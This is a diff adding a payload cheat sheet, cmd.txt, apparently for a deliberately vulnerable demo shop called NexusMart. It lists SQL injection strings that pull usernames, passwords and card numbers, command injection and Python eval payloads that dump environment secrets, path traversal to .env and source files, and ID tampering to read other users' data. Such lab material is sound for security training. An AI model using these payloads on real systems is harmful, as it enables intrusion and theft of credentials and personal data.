@@ -1,0 +1,81 @@
+================================================================================
+NexusMart Digital Platform - Test Input Payload Commands (cmd.txt)
+================================================================================
+
+1. Product Catalog Search (SQL Injection Test Bar)
+--------------------------------------------------------------------------------
+[Standard Usage]:
+Cloud
+
+[Attack Vector 1 - Union SQL Injection]:
+' UNION SELECT 1, username || ':' || password || ':' || credit_card, 'leaked_data', 99.99, 100 FROM users--
+
+[Attack Vector 2 - Always-True Bypass]:
+' OR '1'='1
+
+[Attack Vector 3 - Database Probe]:
+' OR sqlite_version() IS NOT NULL--
+
+
+2. Network Host Diagnostic (Command Injection Test Bar)
+--------------------------------------------------------------------------------
+[Standard Usage]:
+127.0.0.1
+
+[Attack Vector 1 - Command Chaining (Windows / PowerShell)]:
+127.0.0.1 & dir
+
+[Attack Vector 2 - Subshell Command Injection (Linux / Mac)]:
+127.0.0.1; whoami
+
+[Attack Vector 3 - Environment Secret Dumping]:
+127.0.0.1 & set
+
+
+3. Revenue Margin Calculator (RCE / Unsafe Eval Test Bar)
+--------------------------------------------------------------------------------
+[Standard Usage]:
+199.99 * 0.85
+
+[Attack Vector 1 - Python Module Inspection]:
+__import__('os').listdir('.')
+
+[Attack Vector 2 - System Command Execution]:
+__import__('os').popen('whoami').read()
+
+[Attack Vector 3 - Environment Variables Extraction]:
+__import__('os').environ
+
+
+4. Asset & Invoice Downloader (Path Traversal Test Bar)
+--------------------------------------------------------------------------------
+[Standard Usage]:
+sample_invoice.pdf
+
+[Attack Vector 1 - Windows Sensitive File Traversal]:
+..\..\..\..\Windows\win.ini
+
+[Attack Vector 2 - Application Source Code Traversal]:
+..\app.py
+
+[Attack Vector 3 - Environment Config Traversal]:
+..\..\.env
+
+
+5. Merchant Account Lookup (PII & Data Leak Test Bar)
+--------------------------------------------------------------------------------
+[Standard Usage]:
+1
+
+[Attack Vector 1 - Admin Account PII Extraction]:
+1
+
+[Attack Vector 2 - Second User Credit Card / SSN Leak]:
+2
+
+
+6. System Status Metadata (Hardcoded Secret & Debug Leak)
+--------------------------------------------------------------------------------
+[Action]: Click "Fetch Environment Status" button directly to expose AWS keys,
+JWT secret, and DB connection string.
+================================================================================
